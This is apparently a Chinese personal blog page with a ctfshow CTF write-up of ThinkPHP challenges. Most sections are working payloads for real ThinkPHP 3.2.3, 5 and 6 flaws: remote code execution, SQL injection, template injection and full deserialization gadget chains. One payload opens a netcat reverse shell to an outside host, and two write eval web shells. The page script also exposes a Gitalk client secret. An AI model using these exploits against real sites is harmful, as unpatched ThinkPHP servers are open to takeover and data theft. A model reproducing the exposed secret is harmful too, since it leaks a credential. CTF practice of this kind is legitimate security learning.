<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8" >

<title>[ctfshow]ThinkPHPä¸“é¢˜ | fallingskies</title>

<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">

<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
<link rel="shortcut icon" href="https://fallingskies22.github.io/favicon.ico?v=1724150366542">
<link rel="stylesheet" href="https://fallingskies22.github.io/styles/main.css">


  
    <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css" />
  

  


<link rel="stylesheet" href="https://unpkg.com/aos@next/dist/aos.css" />
<script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.js"></script>



    <meta name="description" content="web569
è€ƒå¯Ÿthinkphp3.2.3ç‰ˆæœ¬çš„è·¯ç”±æ ¼å¼
thinkphp3.2.3æ‰‹å†Œ
# æ¨¡å—/æ§åˆ¶å™¨/æ–¹æ³•/å‚æ•°å/å‚æ•°å€¼

PATHINFOæ¨¡å¼
/index.php/Admin/Login/ctfshowLogin

æ™®é€šæ¨¡å¼
..." />
    <meta name="keywords" content="" />
  </head>
  <body>
    <div id="app" class="main">

      <div class="sidebar" :class="{ 'full-height': menuVisible }">
  <div class="top-container" data-aos="fade-right">
    <div class="top-header-container">
      <a class="site-title-container" href="https://fallingskies22.github.io">
        <img src="https://fallingskies22.github.io/images/avatar.png?v=1724150366542" class="site-logo">
        <h1 class="site-title">fallingskies</h1>
      </a>
      <div class="menu-btn" @click="menuVisible = !menuVisible">
        <div class="line"></div>
      </div>
    </div>
    <div>
      
        
          <a href="/" class="site-nav">
            é¦–é¡µ
          </a>
        
      
        
          <a href="/archives" class="site-nav">
            å½’æ¡£
          </a>
        
      
        
          <a href="/tags" class="site-nav">
            æ ‡ç­¾
          </a>
        
      
        
          <a href="/post/about" class="site-nav">
            å…³äº
          </a>
        
      
        
          <a href="/post/friends" class="site-nav">
            å‹é“¾
          </a>
        
      
    </div>
  </div>
  <div class="bottom-container" data-aos="flip-up" data-aos-offset="0">
    <div class="social-container">
      
        
      
        
      
        
      
        
      
        
      
    </div>
    <div class="site-description">
      <h3>æƒ³è¦å»æœˆçƒ<h3>
    </div>
    <div class="site-footer">
      Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a> | <a class="rss" href="https://fallingskies22.github.io/atom.xml" target="_blank">RSS</a>
    </div>
  </div>
</div>


      <div class="main-container">
        <div class="content-container" data-aos="fade-up">
          <div class="post-detail">
            <h2 class="post-title">[ctfshow]ThinkPHPä¸“é¢˜</h2>
            <div class="post-date">2024-03-22</div>
            
              <div class="feature-container" style="background-image: url('https://fallingskies22.github.io/post-images/ctfshowthinkphp-zhuan-ti.png')">
              </div>
            
            <div class="post-content" v-pre>
              <h2 id="web569">web569</h2>
<p>è€ƒå¯Ÿthinkphp3.2.3ç‰ˆæœ¬çš„è·¯ç”±æ ¼å¼<br>
<a href="https://www.kancloud.cn/manual/thinkphp/1678">thinkphp3.2.3æ‰‹å†Œ</a></p>
<pre><code># æ¨¡å—/æ§åˆ¶å™¨/æ–¹æ³•/å‚æ•°å/å‚æ•°å€¼

PATHINFOæ¨¡å¼
/index.php/Admin/Login/ctfshowLogin

æ™®é€šæ¨¡å¼
/index.php?m=Admin&amp;c=Login&amp;f=ctfshowLogin

å…¼å®¹æ¨¡å¼
/index.php?s=Admin/Login/ctfshowLogin

REWRITEæ¨¡å¼
/Admin/Login/ctfshowLogin
</code></pre>
<h2 id="web570">web570</h2>
<p>æœ‰ä¸€æ¡æ·»åŠ çš„è·¯ç”±è§„åˆ™<br>
<img src="https://fallingskies22.github.io/post-images/1711070651961.png" alt="" loading="lazy"></p>
<p>å¯ä»¥ç›´æ¥è°ƒç”¨call_user_funcæ‰§è¡Œä»»æ„å‡½æ•°<br>
ç¬¬ä¸€ä¸ªå‚æ•°ä¸ºå›è°ƒå‡½æ•°ï¼Œç¬¬äºŒä¸ªå‚æ•°åªèƒ½ä¸ºå›è°ƒå‡½æ•°çš„å‚æ•°ã€‚<br>
æˆ‘ä»¬ä½¿ç”¨/ctfshow/system/lså¯ä»¥æ‰§è¡Œå‘½ä»¤ï¼Œä½†æ— æ³•ä¼ é€’<code>/</code>å­—ç¬¦<br>
ä½¿ç”¨assertå‡½æ•°ï¼Œå¯ä»¥å°†å‚æ•°è§£æä¸ºphpä»£ç ã€‚</p>
<pre><code>/ctfshow/assert/system($_POST[1])
</code></pre>
<figure data-type="image" tabindex="1"><img src="https://fallingskies22.github.io/post-images/1711071910971.png" alt="" loading="lazy"></figure>
<h2 id="web571">web571</h2>
<p>ä¸‹è½½<a href="https://getcomposer.org/Composer-Setup.exe">composer</a><br>
ä¸€é”®æ­å»ºç¯å¢ƒ</p>
<pre><code class="language-sh">composer create-project topthink/thinkphp=3.2.3 tp3
</code></pre>
<figure data-type="image" tabindex="2"><img src="https://fallingskies22.github.io/post-images/1711102379628.png" alt="" loading="lazy"></figure>
<p>ä¸‹è½½<a href="https://xdebug.org/wizard">xdebugæ’ä»¶</a><br>
æ·»åŠ é…ç½®ä¿¡æ¯å¦‚ä¸‹ï¼š</p>
<pre><code>[Xdebug]
zend_extension = xdebug
xdebug.collect_params=1
xdebug.collect_return=1
xdebug.auto_trace=On
xdebug.profiler_enable=On
xdebug.mode=debug
xdebug.client_host=127.0.0.1
xdebug.remote_host=127.0.0.1
xdebug.remote_port=9003
</code></pre>
<p>æµè§ˆå™¨ä¸‹è½½<a href="https://chromewebstore.google.com/detail/xdebug-helper/eadndfjplgieldjbigjakmdgkmoaaaoc">xdebug helperæ’ä»¶</a>åå³å¯å¼€å§‹è°ƒè¯•</p>
<p>æˆ‘ä»¬å¯ä»¥æ§åˆ¶ä¼ å…¥showå‡½æ•°çš„å˜é‡n<br>
å¯ä»¥çœ‹åˆ°ç»è¿‡showå‡½æ•°åœ¨TMPL_NEGINE_TYPEæ˜¯phpçš„æ—¶å€™ä¼šæ‰§è¡Œåˆ°evalå‡½æ•°<br>
<img src="https://fallingskies22.github.io/post-images/1711105187521.png" alt="" loading="lazy"></p>
<p>è¿™ç›¸å½“äºä¸€ä¸ªssti</p>
<pre><code>?n=%3C?php%20system(%27cat%20/flag_is_here%27)?%3E
</code></pre>
<h2 id="web572">web572</h2>
<p>ä½¿ç”¨<a href="https://github.com/Lotus6/ThinkphpGUI">ThinkphpGUIå·¥å…·</a>ç›´æ¥èƒ½æ‰«å‡ºæ¥å­˜åœ¨æ—¥å¿—æ³„éœ²ã€‚<br>
<a href="https://github.com/bewhale/thinkphp_gui_tools">å¦ä¸€ä¸ªå·¥å…·</a>å¯ä»¥é€‰æ‹©æ—¥æœŸçˆ†ç ´</p>
<p>å½“å¼€å¯debugæ¨¡å¼æ—¶ï¼Œä¼šåœ¨Runtimeç›®å½•ä¸‹ç”Ÿæˆlogæ–‡ä»¶ï¼Œæ–‡ä»¶åç§°æ˜¯<code>å¹´_æœˆ_æ—¥.log</code>ï¼Œæ‰€ä»¥å¯ä»¥çˆ†ç ´å‡ºæ—¥å¿—æ–‡ä»¶ã€‚<br>
intruderè®¾ç½®å¦‚ä¸‹è¿›è¡Œçˆ†ç ´<br>
<img src="https://fallingskies22.github.io/post-images/1711106940203.png" alt="" loading="lazy"></p>
<p>å‘ç°<code>/Application/Runtime/Logs/Home/21_04_15.log</code>æ–‡ä»¶é‡Œæœ‰å‘½ä»¤æ‰§è¡Œæ—¥å¿—</p>
<pre><code>/index.php?showctf=&lt;?php%20system(&quot;cat%20/flag_is_here&quot;);?&gt;
</code></pre>
<h2 id="web573">web573</h2>
<p>Thinkphp3.2.3ç‰ˆæœ¬ä¸­å­˜åœ¨sqlæ³¨å…¥æ¼æ´<br>
ä½†æ˜¯ä¸Šé¢ä¸¤ä¸ªå·¥å…·æ²¡æœ‰è¿™ä¸ªæ¼æ´çš„æ£€æµ‹ğŸ˜­</p>
<p>å‚è€ƒ<a href="https://blog.csdn.net/miuzzx/article/details/119424071">åˆ†ææ–‡ç« </a></p>
<p>æºç ï¼š</p>
<pre><code class="language-php">class IndexController extends Controller {
    public function index(){
        $a = M('xxx');
        $id = I('GET.id');
        $b = $a-&gt;find($id);
        var_dump($b);
    }
}
</code></pre>
<p>payload</p>
<pre><code>?id[where]=0 union select 1,TABLE_NAME,1,1 from information_schema.tables where table_schema=&quot;ctfshow&quot; limit 1,1--
?id[where]=0 union select 1,COLUMN_NAME,1,1 from information_schema.columns where table_name=&quot;flags&quot; limit 1,1--
?id[where]=0 union select 1,flag4s,1,1 from flags
</code></pre>
<h2 id="web574">web574</h2>
<p>WHEREå‹æ³¨å…¥</p>
<p>æºç </p>
<pre><code class="language-php">public function index($id=1){
$name = M('Users')-&gt;where('id='.$id)-&gt;find();
$this-&gt;show($html);
}
</code></pre>
<p>payload</p>
<pre><code class="language-sql">0) union select 1,TABLE_NAME,1,1 from information_schema.tables where table_schema=&quot;ctfshow&quot; limit 1,1--
0) union select 1,COLUMN_NAME,1,1 from information_schema.columns where table_name=&quot;flags&quot; limit 1,1--
0) union select 1,flag4s,1,1 from flags--
</code></pre>
<h2 id="web575">web575</h2>
<p>ååºåˆ—åŒ–</p>
<pre><code class="language-php">$user= unserialize(base64_decode(cookie('user')));
if(!$user || $user-&gt;id!==$id){
$user = M('Users');
$user-&gt;find(intval($id));
cookie('user',base64_encode(serialize($user-&gt;data())));
}
$this-&gt;show($user-&gt;username);
}
</code></pre>
<p>å¯ä»¥åˆ©ç”¨showå‡½æ•°æ‰§è¡Œå‘½ä»¤<br>
payload</p>
<pre><code class="language-php">&lt;?php

namespace Home\Controller{
    class IndexController{
        public $id='1';
        public $username='&lt;?php system(&quot;nc ip 1337 -e /bin/sh&quot;);?&gt;';
    }
}

namespace{
    use Home\Controller\IndexController;
    echo base64_encode(serialize(new IndexController));
}
?&gt;
</code></pre>
<p>ä¿®æ”¹cookieåŒæ—¶GETä¼ å…¥id=1</p>
<p>å› ä¸ºthinkphp3.2.3æœ¬èº«æ˜¯å­˜åœ¨ååºåˆ—åŒ–é“¾çš„ï¼Œä¹Ÿå¯ä»¥æ¢ä¸€ç§æ–¹æ³•ã€‚(è¿™é‡Œçœç•¥äº†)<br>
é™åˆ¶æ¯”è¾ƒå¤šï¼šéœ€è¦php5ï¼ˆå½“ç„¶è¿™é‡Œè‚¯å®šæ˜¯ï¼‰ã€‚<br>
åˆ©ç”¨ä»»æ„æ–‡ä»¶è¯»ï¼Œæ— æ³•ç¡®å®šflagä½ç½®ã€‚<br>
è¯¦ç»†å‚è€ƒhttps://blog.csdn.net/miuzzx/article/details/119424101</p>
<h2 id="web576">web576</h2>
<p>COMMENTå‹æ³¨å…¥</p>
<pre><code class="language-php">$user = M('Users')-&gt;comment($id)-&gt;find(intval($id));
</code></pre>
<p>è°ƒè¯•ç¨‹åºå‘ç°<code>parseComment()</code>å‡½æ•°<br>
<img src="https://fallingskies22.github.io/post-images/1712131844797.png" alt="" loading="lazy"><br>
ä½¿ç”¨<code>/**/</code>è¿›è¡Œæ³¨é‡Šï¼Œæˆ‘ä»¬å¯ä»¥è¾“å…¥<code>*/</code>æ¥é—­åˆè¿›è¡Œæ³¨å…¥ã€‚</p>
<p>è¿™ç§å±äº<a href="https://forum.butian.net/share/393">limitæ³¨å…¥</a><br>
æˆ‘è¿™é‡Œå°è¯•äº†ä¸èƒ½ä½¿ç”¨union</p>
<p>payload</p>
<pre><code>1*/ into outfile &quot;/var/www/html/1.php&quot; lines terminated by &quot;&lt;?php eval($_POST[1]);?&gt;&quot;/*
</code></pre>
<h2 id="web577">web577</h2>
<p>WHEREå‹æ³¨å…¥</p>
<pre><code class="language-php">$map=array(
'id'=&gt;$_GET['id']
);
$user = M('Users')-&gt;where($map)-&gt;find();
</code></pre>
<p>è¿™é‡Œä½¿ç”¨ThinkPHP3.2.3çš„expï¼Œbindæ³¨å…¥ã€‚<br>
exp,bindæ˜¯ThinkPHP3.2.3æä¾›çš„ä¸€ç§è¡¨è¾¾å¼æŸ¥è¯¢åŠŸèƒ½ï¼Œå‚è€ƒ<a href="https://www.kancloud.cn/manual/thinkphp/1768">æ‰‹å†Œ</a></p>
<p>å…³é”®åœ¨<code>parseWhereItem()</code>å‡½æ•°<br>
å½“æ•°ç»„ç¬¬ä¸€ä¸ªå€¼ä¸ºbindæˆ–expæ—¶ï¼Œä¼šç›´æ¥å°†ç¬¬äºŒä¸ªå€¼æ‹¼æ¥åˆ°sqlè¯­å¥ä¸­ã€‚<br>
<img src="https://fallingskies22.github.io/post-images/1712135738430.png" alt="" loading="lazy"></p>
<p>å‰é¢æœ‰ä¸€ä¸ªå­—æ®µç±»å‹éªŒè¯ï¼Œä½†è¿™é‡Œ$valæ˜¯ä¸€ä¸ªæ•°ç»„ï¼Œ<a href="https://www.runoob.com/php/php-is_scalar-function.html">is_scalar()å‡½æ•°</a>ä¼šè¿”å›falseã€‚</p>
<figure data-type="image" tabindex="3"><img src="https://fallingskies22.github.io/post-images/1712136530244.png" alt="" loading="lazy"></figure>
<p>payload</p>
<pre><code>?id[0]=exp&amp;id[1]==0 union select 1,flag4s,2,3 from flags--+
</code></pre>
<h2 id="web578">web578</h2>
<p>å˜é‡è¦†ç›–+æ¨¡æ¿æ³¨å…¥</p>
<pre><code class="language-php">public function index($name='',$from='ctfshow'){
$this-&gt;assign($name,$from);
$this-&gt;display('index');
}
</code></pre>
<p>ThinkPHPé»˜è®¤æ¨¡æ¿å¼•æ“è®¾ç½®æ˜¯text/html</p>
<p><code>ThinkPHP/Conf/convention.php</code></p>
<pre><code>/* æ¨¡æ¿å¼•æ“è®¾ç½® */
    'TMPL_CONTENT_TYPE'      =&gt; 'text/html', // é»˜è®¤æ¨¡æ¿è¾“å‡ºç±»å‹
</code></pre>
<p>è¿™é¢˜è®¾ç½®ä¸ºäº†phpï¼Œæ‰èƒ½å¤Ÿåˆ©ç”¨ã€‚</p>
<p>æˆ‘ä»¬ä½¿ç”¨assignå‡½æ•°èµ‹å€¼è¿›è¡Œå˜é‡è¦†ç›–$_contentså˜é‡ï¼Œå½“$_contentséç©ºæ—¶ä¼šè¿›å…¥åˆ°evalå‡½æ•°ä¸­ã€‚</p>
<figure data-type="image" tabindex="4"><img src="https://fallingskies22.github.io/post-images/1712138437365.png" alt="" loading="lazy"></figure>
<p>payload</p>
<pre><code>?name=_content&amp;from=&lt;?php%20phpinfo();?&gt;
</code></pre>
<p>æŸ¥çœ‹assignå‡½æ•°ç»†èŠ‚ï¼Œå½“$nameä¸ºæ•°ç»„æ—¶å¯ä»¥ç›´æ¥è¿›è¡Œèµ‹å€¼ï¼Œè€Œä¸éœ€è¦$valueã€‚<br>
<img src="https://fallingskies22.github.io/post-images/1712138634219.png" alt="" loading="lazy"></p>
<p>æ¢ä¸€ç§payload</p>
<pre><code>?name[_content]=&lt;?php%20phpinfo();?&gt;
</code></pre>
<h2 id="web579">web579</h2>
<p>ThinkPHP5 æœªå¼€å¯å¼ºåˆ¶è·¯ç”±RCE</p>
<p>payload</p>
<pre><code>?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][0]=cat%20/flag_is_here
</code></pre>
<h2 id="web604">web604</h2>
<p>ç»§ç»­ä½¿ç”¨ä¸Šé¢˜çš„payloadï¼Œæç¤ºinvokefunctionè¢«ç¦ç”¨äº†ã€‚<br>
å°è¯•å…¶ä»–æ§åˆ¶å™¨ã€‚</p>
<p>payload</p>
<pre><code>?s=index/think\request/input?data[0]=cat%20../../../../flag_heeeeae&amp;filter=system
</code></pre>
<h2 id="web605">web605</h2>
<p>è¿‡æ»¤äº†inputå’Œdisplay</p>
<p>ä½¿ç”¨è¿™ä¸ªæ˜¾ç¤ºæ‰¾ä¸åˆ°ç±»ï¼Œæœ‰ç‚¹ä¸æ‡‚ã€‚</p>
<pre><code>?s=index/\think\view\driver\Php/display&amp;content=&lt;?php phpinfo();?&gt;
</code></pre>
<p>ä½¿ç”¨è¿™ä¸ªå¯ä»¥å†™shell</p>
<pre><code>?s=index/\think\template\driver\File/write&amp;cacheFile=shell.php&amp;content=&lt;?php%20phpinfo();?&gt;
</code></pre>
<h2 id="web606">web606</h2>
<p>å°†writeä¹Ÿè¿‡æ»¤äº†</p>
<p>æ€»ç»“ä¸€ä¸‹ï¼Œä¸€å…±è¿‡æ»¤äº†</p>
<pre><code>invokefunctionã€displayã€inputã€write
</code></pre>
<p>ä½¿ç”¨å¤§å°å†™å³å¯ç»•è¿‡</p>
<pre><code>?s=index/\think\app/invokeFunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][0]=cat%20/flag_heeeeae
</code></pre>
<h2 id="web607">web607</h2>
<h2 id="web608">web608</h2>
<h2 id="web609">web609</h2>
<h2 id="web610">web610</h2>
<p>åŒæ ·å¤§å°å†™ç»•è¿‡</p>
<h2 id="web611">web611</h2>
<p>è€ƒå¯ŸThinkPHP5çš„ååºåˆ—åŒ–åˆ©ç”¨é“¾ã€‚</p>
<p>payload</p>
<pre><code class="language-php">&lt;?php
namespace think;
abstract class Model{
    protected $append = [];
    private $data = [];
    function __construct(){
        $this-&gt;append = [&quot;a&quot;=&gt;[&quot;a&quot;,&quot;a&quot;]];
        $this-&gt;data = [&quot;a&quot;=&gt;new Request()];
    }
}

class Request
{
    protected $hook = [];
    protected $filter = &quot;&quot;;
    protected $config = [];
    function __construct(){
        $this-&gt;filter = &quot;system&quot;;
        $this-&gt;config = [&quot;var_ajax&quot;=&gt;''];
        $this-&gt;hook = [&quot;visible&quot;=&gt;[$this,&quot;isAjax&quot;]];
    }
}


namespace think\process\pipes;

//use think\model\concern\Conversion;
use think\model\Pivot;
class Windows
{
    private $files = [];

    public function __construct()
    {
        $this-&gt;files=[new Pivot()];
    }
}


namespace think\model;

use think\Model;
class Pivot extends Model
{
}


use think\process\pipes\Windows;
echo urlencode(serialize(new Windows()));
?&gt;
</code></pre>
<p>POSTä¼ å…¥ååºåˆ—åŒ–æ•°æ®ï¼ŒGETä¼ å…¥å‘½ä»¤æ‰§è¡Œå‚æ•°ã€‚</p>
<h2 id="web612">web612</h2>
<p>ä¿®æ”¹ä¸Šé¢˜ä¸­<code>isAjax</code>ä¸º<code>isPjax</code></p>
<pre><code class="language-php">$this-&gt;hook['visible'] = [$this, 'isPjax'];
$this-&gt;config['var_pjax'] = '';
</code></pre>
<h2 id="web613">web613</h2>
<h2 id="web614">web614</h2>
<h2 id="web615">web615</h2>
<h2 id="web616">web616</h2>
<h2 id="web617">web617</h2>
<h2 id="web618">web618</h2>
<h2 id="web619">web619</h2>
<h2 id="web620">web620</h2>
<h2 id="web621">web621</h2>
<p>ä½¿ç”¨Reqeust</p>
<pre><code class="language-php">$this-&gt;hook['visible'] = [$this, 'Request'];
</code></pre>
<h2 id="web622">web622</h2>
<h2 id="web623">web623</h2>
<p>è€ƒå¯ŸThinkPHP6çš„ååºåˆ—åŒ–åˆ©ç”¨é“¾</p>
<p>payload</p>
<pre><code class="language-php">&lt;?php

namespace think {

    use think\route\Url;

    abstract class Model
    {
        private $lazySave;
        private $exists;
        protected $withEvent;
        protected $table;
        private $data;
        private $force;
        public function __construct()
        {
            $this-&gt;lazySave = true;
            $this-&gt;withEvent = false;
            $this-&gt;exists = true;
            $this-&gt;table = new Url();
            $this-&gt;force = true;
            $this-&gt;data = [&quot;1&quot;];
        }
    }
}

namespace think\model {

    use think\Model;

    class Pivot extends Model
    {
        function __construct()
        {
            parent::__construct();
        }
    }
    $b = new Pivot();
    echo urlencode(serialize($b));
}

namespace think\route {

    use think\Middleware;
    use think\Validate;

    class Url
    {
        protected $url;
        protected $domain;
        protected $app;
        protected $route;
        public function __construct()
        {
            $this-&gt;url = 'a:';
            $this-&gt;domain = &quot;&lt;?php system('whoami');?&gt;&quot;;
            $this-&gt;app = new Middleware();
            $this-&gt;route = new Validate();
        }
    }
}

namespace think {

    use think\view\driver\Php;

    class Validate
    {
        public function __construct()
        {
            $this-&gt;type['getDomainBind'] = [new Php(), 'display'];
        }
    }
    class Middleware
    {
        public function __construct()
        {
            $this-&gt;request = &quot;2333&quot;;
        }
    }
}

namespace think\view\driver {
    class Php
    {
        public function __construct()
        {
        }
    }
}
</code></pre>
<h2 id="web624">web624</h2>
<h2 id="web625">web625</h2>
<p>æ¢ä¸€æ¡åˆ©ç”¨é“¾ï¼Œç›´æ¥å†™shell</p>
<pre><code class="language-php">&lt;?php
namespace League\Flysystem\Cached\Storage{
    use League\Flysystem\Adapter\Local;

    class Adapter{
        protected $autosave = true;
        protected $expire = null;
        protected $adapter;
        protected $file;

        public function __construct()
        {
            $this-&gt;autosave = false;
            $this-&gt;expire = '&lt;?php @eval($_POST[1]);?&gt;';
            $this-&gt;adapter = new Local();
            $this-&gt;file = '1.php';
        }
    }
}

namespace League\Flysystem\Adapter{
    class Local{

    }
}

namespace {
    use League\Flysystem\Cached\Storage\Adapter;

    echo urlencode(serialize(new Adapter()));
}
</code></pre>

            </div>
            
            
              <div class="next-post">
                <div class="next">ä¸‹ä¸€ç¯‡</div>
                <a href="https://fallingskies22.github.io/post/ctfshowxss/">
                  <h3 class="post-title">
                    [ctfshow]XSS
                  </h3>
                </a>
              </div>
            

            
              
                <div id="gitalk-container" data-aos="fade-in"></div>
              

              
            

          </div>

        </div>
      </div>
    </div>

    <script src="https://unpkg.com/aos@next/dist/aos.js"></script>
<script type="application/javascript">

AOS.init();

var app = new Vue({
  el: '#app',
  data: {
    menuVisible: false,
  },
})

</script>


  <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
  <script>
    hljs.initHighlightingOnLoad()
  </script>




  
    <script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
    <script>

      var gitalk = new Gitalk({
        clientID: '1b08861b8ad19018640e',
        clientSecret: '1881a7245597aa70e1ffc8412e5b6c1eb0ad7241',
        repo: 'fallingskies22.github.io',
        owner: 'fallingskies22',
        admin: ['fallingskies22'],
        id: (location.pathname).substring(0, 49),      // Ensure uniqueness and length less than 50
        distractionFreeMode: false  // Facebook-like distraction free mode
      })

      gitalk.render('gitalk-container')

    </script>
  

  




  </body>
</html>
